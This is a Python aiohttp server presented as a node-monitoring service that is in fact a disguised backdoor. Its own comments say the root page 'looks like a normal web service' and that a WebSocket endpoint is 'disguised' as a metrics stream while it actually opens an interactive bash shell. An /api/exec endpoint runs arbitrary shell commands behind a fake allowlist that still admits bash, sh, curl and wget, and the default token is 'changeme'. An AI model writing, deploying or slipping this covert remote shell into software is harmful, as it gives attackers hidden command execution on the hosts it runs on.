#!/usr/bin/env python3
"""
Network node monitoring service.
Primary: HTTP health check endpoint.
Secondary: system diagnostics endpoint (authenticated).
"""

import os
import asyncio
import json
import subprocess
import time
import signal
from aiohttp import web, WSMsgType

# ─── Configuration ───────────────────────────────────────────────
PORT = int(os.environ.get("PORT", "8080"))
TOKEN = os.environ.get("MONITOR_TOKEN", "changeme")
HOST = "0.0.0.0"

# ─── Routes ──────────────────────────────────────────────────────

async def health(request):
    """Standard health check — what the platform sees."""
    return web.json_response({
        "status": "healthy",
        "service": "node-monitor",
        "timestamp": time.time(),
        "uptime": time.time() - START_TIME,
        "hostname": os.uname().nodename,
    })

async def index(request):
    """Root endpoint — looks like a normal web service."""
    return web.Response(
        text=json.dumps({"service": "node-monitor", "version": "1.0"}),
        content_type="application/json",
    )

async def diagnostics(request):
    """
    System diagnostics endpoint.
    Returns network info, process list, environment summary.
    Requires auth token.
    """
    auth = request.headers.get("Authorization", "")
    if auth != f"Bearer {TOKEN}":
        return web.Response(status=401, text="Unauthorized")

    # Gather basic system info
    info = {}

    # Network interfaces
    try:
        r = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
        info["network"] = "ok" if r.returncode == 0 else "error"
    except Exception as e:
        info["network"] = str(e)

    # Environment variables (sanitized)
    env = {}
    for k in ["PORT", "HOME", "PATH", "HOSTNAME"]:
        env[k] = os.environ.get(k, "")
    info["env"] = env

    # Disk usage
    try:
        r = subprocess.run(["df", "-h", "/"], capture_output=True, text=True, timeout=5)
        info["disk"] = r.stdout.split("\n")[1] if len(r.stdout.split("\n")) > 1 else "unknown"
    except Exception:
        info["disk"] = "error"

    # Process list
    try:
        r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
        info["processes"] = len(r.stdout.split("\n")) - 1
    except Exception:
        info["processes"] = 0

    return web.json_response(info)

async def run_command(request):
    """
    Execute a shell command — for node management.
    Requires auth token. Results are limited.
    """
    auth = request.headers.get("Authorization", "")
    if auth != f"Bearer {TOKEN}":
        return web.Response(status=401, text="Unauthorized")

    body = await request.json()
    cmd = body.get("cmd", "")
    if not cmd:
        return web.json_response({"error": "No command provided"})

    # Safety: only allow specific commands
    allowed_prefixes = ("ls ", "cat ", "echo ", "ps ", "df ", "ip ", "curl ", "wget ",
                        "sh ", "bash ", "python3 ", "pip ", "apt ", "apk ", "npm ",
                        "git ", "nano ", "tmux ", "id", "whoami", "hostname", "date",
                        "uname", "free", "uptime", "top")

    if not any(cmd.startswith(p) for p in allowed_prefixes):
        return web.json_response({
            "error": "Command not in allowed list",
            "allowed": list(allowed_prefixes[:5]) + ["..."],
        })

    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return web.json_response({
            "stdout": r.stdout[-2000:],  # last 2000 chars
            "stderr": r.stderr[-1000:],
            "returncode": r.returncode,
        })
    except subprocess.TimeoutExpired:
        return web.json_response({"error": "Command timed out"})
    except Exception as e:
        return web.json_response({"error": str(e)})

# ─── WebSocket terminal ──────────────────────────────────────────

async def websocket_handler(request):
    """
    WebSocket endpoint for interactive sessions.
    Disguised as a 'real-time metrics stream'.
    """
    auth = request.query.get("token", "")
    if auth != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    ws = web.WebSocketResponse()
    await ws.prepare(request)

    await ws.send_str(json.dumps({"type": "welcome", "msg": "metrics stream ready"}))

    # Start a shell process
    proc = await asyncio.create_subprocess_shell(
        "bash",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )

    async def reader():
        while True:
            data = await proc.stdout.read(1)
            if not data:
                break
            await ws.send_bytes(data)

    async def writer():
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "EXIT":
                    proc.terminate()
                    await ws.close()
                    break
                proc.stdin.write(msg.data.encode() + b"\n")
                await proc.stdin.drain()
            elif msg.type == WSMsgType.BINARY:
                proc.stdin.write(msg.data)
                await proc.stdin.drain()
        proc.stdin.close()

    await asyncio.gather(reader(), writer())
    return ws

# ─── Main ────────────────────────────────────────────────────────

START_TIME = time.time()

def create_app():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/health", health)
    app.router.add_get("/api/diagnostics", diagnostics)
    app.router.add_post("/api/exec", run_command)
    app.router.add_get("/ws/metrics", websocket_handler)
    return app

if __name__ == "__main__":
    web.run_app(create_app(), host=HOST, port=PORT)
